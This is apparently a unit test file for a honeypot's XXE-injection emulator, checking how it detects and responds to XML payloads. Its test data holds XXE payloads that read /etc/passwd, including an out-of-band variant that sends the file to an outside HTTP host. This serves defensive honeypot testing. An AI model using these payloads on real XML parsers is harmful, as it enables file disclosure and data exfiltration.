import asyncio
import unittest

from unittest import mock
from tanner import config
from tanner.utils.asyncmock import AsyncMock
from tanner.emulators.xxe_injection import XXEInjection


class TestXXEInjection(unittest.TestCase):
    def setUp(self):
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(None)
        self.handler = XXEInjection(loop=self.loop)
        self.result = None
        self.expected_result = None
        self.returned_result = None

    def test_scan(self):
        payload = '<?xml version="1.0" encoding="ISO-8859-1"?>' "<!DOCTYPE foo [ <!ELEMENT foo ANY >"

        self.expected_result = dict(name="xxe_injection", order=3)
        self.returned_result = self.handler.scan(payload)
        self.assertEqual(self.returned_result, self.expected_result)

    def test_scan_negative(self):
        payload = '<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>'

        self.expected_result = None
        self.returned_result = self.handler.scan(payload)
        self.assertEqual(self.returned_result, self.expected_result)

    def test_handle_status_code(self):
        self.handler.get_injection_result = AsyncMock(return_value=None)

        attack_params = [dict(id="foo", value='<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>')]
        self.expected_result = dict(status_code=504)

        async def test():
            self.returned_result = await self.handler.handle(attack_params)

        self.loop.run_until_complete(test())
        self.assertEqual(self.returned_result, self.expected_result)

    def test_handle(self):
        config.TannerConfig.get = mock.MagicMock(return_value=False)

        code = (
            '<?xml version="1.0" encoding="ISO-8859-1"?>'
            "<!DOCTYPE foo [ <!ELEMENT foo ANY >"
            '<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>'
            "<data>&xxe;</data>"
        )

        attack_params = [dict(id="foo", value=code)]
        self.handler.helper.get_result = AsyncMock(
            return_value={
                "file_md5": "a43deb0f2d7904cbb6c27c02ed7c2593",
                "stdout": "root:x:0:0:root:/root:/bin/bash\n\n" "daemon:x:1:1:daemon:/usr/sbin",
            }
        )

        self.expected_result = "root:x:0:0:root:/root:/bin/bash"

        async def test():
            self.returned_result = await self.handler.handle(attack_params)

        self.loop.run_until_complete(test())
        self.assertIn(self.expected_result, self.returned_result["value"])

    def test_handle_oob(self):
        config.TannerConfig.get = mock.MagicMock(return_value=True)

        code = (
            '<?xml version="1.0" encoding="ISO-8859-1"?>'
            "<!DOCTYPE foo [ <!ELEMENT foo ANY >"
            '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
            "<!ENTITY % int '<!ENTITY % trick SYSTEM ]>"
            '"http://192.168.1.1:8080/?p=%xxe;">\'> '
        )

        attack_params = [dict(id="OOB", value=code)]
        self.handler.helper.get_result = AsyncMock(
            return_value={
                "file_md5": "a43deb0f2d7904cbb6c27c02ed7c2593",
                "stdout": "root:x:0:0:root:/root:/bin/bash\n\n" "daemon:x:1:1:daemon:/usr/sbin",
            }
        )

        self.expected_result = ""

        async def test():
            self.returned_result = await self.handler.handle(attack_params)

        self.loop.run_until_complete(test())
        self.assertEqual(self.returned_result["value"], self.expected_result)
